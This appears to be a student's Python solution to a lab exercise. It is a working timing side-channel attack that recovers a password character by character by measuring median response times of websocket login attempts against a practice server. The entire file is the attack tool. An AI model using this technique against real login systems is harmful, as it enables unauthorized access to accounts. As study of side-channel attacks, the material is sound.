import asyncio, websockets
from json import dumps, loads
from time import sleep, perf_counter
import string, statistics

async def client_connect(username, password, variance=0.10):
    """Handle sending and receiving logins to & from the server.
    'while True' structure prevents singular network/socket
    errors from causing full crash.

    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt
        variance -- float of maximum network delay

    Returns
    -------
        reply -- string of server's response to login attempt
    """

    #server_address = "ws://20.224.193.77:8080"
    #server_address = "ws://127.0.0.1:8080"
    #server_address = "ws://192.168.178.190:3840"
    server_address = "ws://192.168.178.18:3840"

    while True:
        try:
            async with websockets.connect(server_address) as websocket:
                await websocket.send(dumps([username,password,variance]))
                t0 = perf_counter()
                reply = await websocket.recv()
                t1 = perf_counter()
            return loads(reply), t1 - t0
        except:
            continue

def call_server(username, password, variance=0.001):
    """Send a login attempt of username + password to the server
    and return the response. Optionally takes the variable variance to
    allow simulation of random network delays; the server will then
    delay its response by n microseconds, where 0 < n < variance.
    A higher variance will make guessing the password harder.


    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt
        variance -- float of maximum delay, must be greater than 0.000001

    Returns
    -------
        reply -- string of server's response to login attempt
    """

    
    reply, duration = asyncio.run(client_connect(username, password, variance))
    sleep(0.001)
    return reply, duration

def lowest_return(username,pass_str,iterations=1):
    """ Function finds the lowest measured response time.

    - Replaces the leftmost character of pass_str
    - Calls call_server(username, new_str)
    - Repeats for `iterations`
    - Returns the lowest duration observed
    """

    #Note to self: this is a troubleshooting aide. 
    #Wrote it this way because this is more memory efficient than the ussual list approach.
    
    chars =  string.ascii_lowercase + string.digits
    lowest_float = 100.0

    for _ in range(iterations):                             
        for c in chars:                                     
            new_str = c + pass_str[1:]
            reply, duration = call_server(username,new_str) 
            
            if duration < lowest_float:
                lowest_float = duration
        
    return lowest_float

def print_dict(d):
    """
    Print the contents of a dictionary with a blank line separating each
    key–value pair.

    Args:
        d (dict): The dictionary whose contents will be printed.

    Returns:
        None
    """
    #troubleshooting aide

    for key, value in d.items():
        print(f"{key}: {value}")
        print()

def get_lowest(data):
    """
    Compute the lowest recorded duration for each key in the dictionary.

    Args:
        data (dict): A dictionary where keys map to lists of recorded durations.

    Returns:
        dict: A dictionary mapping each key to its lowest recorded duration.
    """

    #Trying something

    lowest = {}

    for key, values in data.items():
        lowest[key] = min(values)

    return lowest

def iterate_cycle(username, password, position):

    """
    Tests all lowercase letters and digits at a specific position in a password
    and records the response time for each attempt.

    For each character in the set [a-z0-9], the function replaces the character
    at the given position in the password, sends the modified password to the
    server using `call_server`, and stores the returned duration.

    Args:
        username (str): The username used for the authentication attempt.
        password (str): The current password guess.
        position (int): The index in the password to replace with test characters.

    Returns:
        dict: A dictionary mapping each tested character to a list of response
        durations returned by the server.
    """
    
    chars = string.ascii_lowercase + string.digits
    data = {}

    for c in chars:
        new_str = password[:position] + c + password[position+1:]
        _, duration = call_server(username, new_str)

        data.setdefault(c, []).append(duration)

    return data


def get_medians(data):

    """
    Computes the median duration for each character from collected timing data.

    Args:
        data (dict): A dictionary where keys are characters and values are lists
        of durations recorded for those characters.

    Returns:
        dict: A dictionary mapping each character to the median of its recorded
        durations.
    """

    medians = {}

    for key, values in data.items():
        medians[key] = statistics.median(values)

    return medians    


username = "428180"
password = "aaaaaaa"
mutable_pass = password

#times I want the programm to cycle through the batch of 36 lowercase letters and single digit numbers per position.
repeat = 501

print("\n")
print("Cooking, please hold...\n")
print("Btw, if you ran this without adjusting anything then you might wanna cancel that run or grab a cup of coffee or two, because if you are reading this then you should know that this function is set to iterate over 36 characters 501 times x7...")
print("Adjust the value on line 163 to change that\n")

for i in range(len(password)):

    data ={}

    for c in range(repeat):
        new_data = iterate_cycle(username, mutable_pass, i)

        for k, v in new_data.items():                           #adds the values from new_data{} to the correct keys in data{}
            data.setdefault(k, []).extend(v)

    medians = get_medians(data)
    #medians = get_lowest(data)

    key1, value1 = max(medians.items(), key=lambda x: x[1])
    key2, value2 = min(medians.items(), key=lambda x: x[1])
    mutable_pass = mutable_pass[:i] + key1 + mutable_pass[i+1:]
   
    print_dict(data)
    print("\n")
    print("mutable password: ", mutable_pass)
    print("\n")
    print("Medians: ",medians)
    

